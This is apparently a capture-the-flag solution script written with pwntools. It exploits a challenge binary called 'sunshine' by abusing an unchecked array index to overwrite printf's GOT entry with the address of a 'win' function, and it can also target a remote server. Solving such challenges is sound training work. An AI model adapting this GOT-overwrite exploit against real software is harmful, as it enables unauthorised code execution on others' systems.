from pwn import *
from warnings import filterwarnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break *basket+70
break *basket+183
break *basket+232
continue
'''.format(**locals())

# Binary filename
exe = './sunshine'
elf = context.binary = ELF(exe, checksec=False)
# context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'
filterwarnings("ignore")
global io


# ==================================================================================#
#                           EXPLOIT GOES HERE                                       #
# ==================================================================================#

def loop():
    offset = (elf.sym['printf_sym'] - elf.sym['fruits']) // 8
    info("Offset to trigger while loop: %i", offset)
    io.recvuntil('>>>')
    io.sendline(str(offset))
    overwrite = p64(0x6).ljust(8, b'\x00')
    io.recvuntil('>>>')
    io.sendline(overwrite)

def overwrite():
    offset = (elf.got['printf'] - elf.sym['fruits']) // 8
    info("Offset to overwrite printf@got: %i", offset)
    io.recvuntil('>>>')
    io.sendline(str(offset))
    info("Function address to be called: %#x", elf.sym['win'])
    io.sendline(p64(elf.sym['win']))
    io.recvline()
    print(io.recvline())

if __name__ == '__main__':
    io = start()
    loop()
    overwrite()
    
    io.close()
